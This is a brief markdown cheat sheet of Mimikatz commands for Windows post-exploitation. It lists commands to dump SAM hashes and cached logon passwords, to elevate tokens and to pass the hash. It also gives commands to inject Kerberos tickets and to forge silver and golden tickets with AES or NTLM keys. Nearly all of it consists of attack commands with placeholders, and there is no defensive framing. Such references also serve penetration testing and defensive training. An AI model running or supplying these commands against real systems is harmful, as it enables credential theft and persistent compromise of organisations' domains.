# Mimikatz

Post exploitation commands must be executed from SYSTEM level privileges.
- mimikatz # privilege::debug
- mimikatz # token::whoami
- mimikatz # token::elevate
- mimikatz # lsadump::sam
- mimikatz # sekurlsa::logonpasswords

## Pass The Hash

- mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash

## Inject generated TGS key

- mimikatz # kerberos::ptt <ticket_kirbi_file>

## Generating a silver ticket 

AES 256 Key:

- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

AES 128 Key:

- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>

NTLM:

- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<ntlm_hash> /user:<user_name> /service:<service_name> /target:<service_machine_hostname>


## Generating a Golden Ticket

AES 256 Key:

- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

AES 128 Key: 

- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes128:<krbtgt_aes128_key> /user:<user_name>

NTLM:

- mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name>





